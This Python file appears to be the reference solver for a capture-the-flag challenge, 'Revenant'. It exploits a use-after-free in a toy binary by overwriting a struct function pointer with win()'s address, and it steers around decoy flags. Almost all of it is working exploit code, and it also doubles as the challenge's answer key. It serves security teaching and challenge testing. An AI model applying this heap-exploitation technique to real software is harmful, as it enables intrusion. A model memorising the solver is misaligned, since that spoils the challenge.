#!/usr/bin/env python3
"""
ZSCTF :: Revenant -- reference solver.

Technique: use-after-free (CWE-416) -> struct function-pointer overwrite ->
win(). Pure Python: the payload is assembled by hand with struct.pack over the
service's own text protocol. NO pwntools, NO framework.

Intended path (see writeup.md for the annotated layout reasoning):
  1. `new`           -> allocate record #0. sizeof(record_t)==32, so malloc(32)
                        returns a chunk in the 0x30 tcache size class. record#0's
                        handler (render, at struct offset 24) = default_render.
  2. `free 0`        -> the chunk is pushed onto the 0x30 tcache bin. The BUG:
                        slot 0 is NOT cleared, so it now dangles at that chunk.
  3. `note 32`       -> malloc(32) is served from the SAME 0x30 tcache bin
                        (single-threaded tcache reuse is LIFO and deterministic),
                        so note #1's buffer overlaps freed record #0. Creating
                        the note zeroes the buffer -> record#0.render becomes 0.
  4. `write 1 ...`   -> write 24 padding bytes + the 8-byte little-endian address
                        of win() into note #1. Because the note overlaps record#0,
                        this sets record#0.render = &win.
  5. `render 0`      -> the dangling record#0 invokes render == win, disclosing
                        the flag. -no-pie fixes win()'s address, so NO leak is
                        needed; we resolve it from the binary's symbol table.

Rabbit-holes this solver deliberately steps around (all rejectable by reasoning,
see writeup.md "Rabbit-holes"):
  - The banner prints flag-SHAPED decoys (a baked `zerosecureCTF{...}` and a
    per-ZSCTF_SEED `zerosecurectf{SESS-...}`). extract_flag() accepts ONLY the
    first match that passes the PUBLISHED strict validator
    ^zerosecurectf\\{[a-z0-9_]{8,48}\\}$ -- both decoys fail it (uppercase / '-').
  - `promote`/admin_panel() look win-ish but read no environment; we target
    win(), the only routine that reads ZSCTF_FLAG.
  - `note 24` would land in the 0x20 bin (no overlap) and `write`ing only 16
    bytes would miss render at offset 24 -- both corrupt-or-noop, never win.

Usage:
  Local  : python3 solve.py --local ./build/revenant
  Remote : python3 solve.py --remote HOST PORT [--bin ./revenant]
"""
import re
import sys
import socket
import struct
import argparse
import subprocess

# --- fixed facts about THIS binary (benign toy; -no-pie => stable address) ---
RENDER_OFFSET = 24          # offsetof(record_t, render), straight from the source
NOTE_SIZE     = 32          # a note size that lands in the record's 0x30 tcache bin
WIN_ADDR      = 0x401654    # win() in the reference gcc-13 build (fallback only)

# The PUBLISHED strict flag validator (also in README.md / writeup.md).
STRICT_FLAG = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")


# --------------------------------------------------------------------------
# Minimal, dependency-free ELF symbol lookup. We read win()'s address straight
# out of the binary's symbol table instead of trusting the baked-in constant,
# so the exploit is robust across rebuilds / toolchains. If the binary is
# stripped or absent, we fall back to WIN_ADDR.
# --------------------------------------------------------------------------
def elf_symbol_addr(path, name):
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        return None
    if data[:4] != b"\x7fELF" or data[4] != 2:   # 64-bit only
        return None
    le = "<" if data[5] == 1 else ">"
    e_shoff = struct.unpack_from(le + "Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from(le + "H", data, 0x3A)[0]
    e_shnum = struct.unpack_from(le + "H", data, 0x3C)[0]

    sections = []  # (sh_type, sh_offset, sh_size, sh_link, sh_entsize)
    for i in range(e_shnum):
        base = e_shoff + i * e_shentsize
        sections.append((
            struct.unpack_from(le + "I", data, base + 4)[0],
            struct.unpack_from(le + "Q", data, base + 0x18)[0],
            struct.unpack_from(le + "Q", data, base + 0x20)[0],
            struct.unpack_from(le + "I", data, base + 0x28)[0],
            struct.unpack_from(le + "Q", data, base + 0x38)[0],
        ))

    for sh_type, sh_offset, sh_size, sh_link, sh_entsize in sections:
        if sh_type not in (2, 11) or sh_entsize == 0:   # SHT_SYMTAB / SHT_DYNSYM
            continue
        str_off = sections[sh_link][1]
        str_size = sections[sh_link][2]
        strtab = data[str_off:str_off + str_size]
        for off in range(sh_offset, sh_offset + sh_size, sh_entsize):
            st_name = struct.unpack_from(le + "I", data, off)[0]
            st_value = struct.unpack_from(le + "Q", data, off + 8)[0]
            end = strtab.find(b"\x00", st_name)
            if strtab[st_name:end] == name.encode():
                return st_value
    return None


# --------------------------------------------------------------------------
# Build the exploit script for the service's text protocol. The only binary
# content is the 8-byte little-endian win() address packed with struct.pack.
# --------------------------------------------------------------------------
def build_script(win_addr):
    raw = b"A" * RENDER_OFFSET + struct.pack("<Q", win_addr)
    script = b""
    script += b"new\n"                                   # record #0 (0x30 chunk)
    script += b"free 0\n"                                # UAF: slot 0 dangles
    script += b"note %d\n" % NOTE_SIZE                   # note #1 reuses the chunk
    script += b"write 1 %d\n" % len(raw) + raw + b"\n"   # set record#0.render = win
    script += b"render 0\n"                              # invoke -> win() prints flag
    script += b"quit\n"
    return script


# --- transports -----------------------------------------------------------
def run_local(binary, script, env=None, timeout=20):
    p = subprocess.run([binary], input=script, capture_output=True,
                       env=env, timeout=timeout)
    return p.stdout + p.stderr


def run_remote(host, port, script, timeout=20):
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(script)
        try:
            s.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        chunks = []
        while True:
            try:
                b = s.recv(4096)
            except socket.timeout:
                break
            if not b:
                break
            chunks.append(b)
        return b"".join(chunks)


def extract_flag(blob):
    """Return the first flag-shaped token that passes the PUBLISHED strict
    validator. This is the documented escape from the decoy rabbit-holes: the
    banner's decoys (zerosecureCTF{...}, zerosecurectf{SESS-...}) appear FIRST
    in the output, so a naive 'first zerosecurectf{...}' grab returns a decoy.
    The strict validator rejects them (uppercase / hyphen)."""
    text = blob.decode("latin-1", "replace")
    for m in re.finditer(r"zerosecurectf\{[^}]*\}", text):
        if STRICT_FLAG.match(m.group(0)):
            return m.group(0)
    return None


def naive_first_match(blob):
    """What a lazy solver would submit: the FIRST flag-shaped token, no
    validation. Provided so the test can prove the shortcut yields a decoy."""
    text = blob.decode("latin-1", "replace")
    # case-insensitive, like a careless `grep -i`
    m = re.search(r"zerosecure[a-z]*\{[^}]*\}", text, re.IGNORECASE)
    return m.group(0) if m else None


def main():
    ap = argparse.ArgumentParser(description="Revenant UAF reference solver")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--local", metavar="BINARY", help="path to the revenant binary")
    g.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"),
                   help="host and port of a deployed instance")
    ap.add_argument("--bin", metavar="PATH",
                    help="with --remote: a local copy of the binary to resolve win() from")
    args = ap.parse_args()

    win_addr = WIN_ADDR
    bin_for_sym = args.local or args.bin
    if bin_for_sym:
        resolved = elf_symbol_addr(bin_for_sym, "win")
        if resolved:
            win_addr = resolved
            print("[*] resolved win() from ELF symtab -> 0x%x" % win_addr)
        else:
            print("[*] win() not in symtab; using baked-in 0x%x" % win_addr)
    else:
        print("[*] no binary given; using baked-in win() 0x%x" % win_addr)

    script = build_script(win_addr)
    print("[*] exploit: new; free 0; note %d; write 1 (%d pad + 8-byte win); render 0"
          % (NOTE_SIZE, RENDER_OFFSET))

    if args.local:
        out = run_local(args.local, script)
    else:
        out = run_remote(args.remote[0], int(args.remote[1]), script)

    sys.stdout.buffer.write(b"--- service output ---\n")
    sys.stdout.buffer.write(out)
    if not out.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.flush()

    flag = extract_flag(out)
    if flag:
        print("[+] FLAG = " + flag)
        return 0
    print("[-] no valid flag recovered (only decoys?)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
